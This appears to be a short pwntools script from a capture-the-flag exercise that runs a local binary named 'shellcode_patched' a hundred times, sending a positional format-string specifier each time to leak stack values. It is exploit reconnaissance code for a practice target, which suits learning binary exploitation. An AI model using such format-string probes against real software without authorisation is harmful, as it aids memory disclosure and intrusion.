from pwn import *
elf = context.binary = ELF("./shellcode_patched")

for i in range(100):
    p = process()
    print(f"===============> {i}")
    p.sendline(f"%{i}$k")
    print(p.recvall())
    p.close()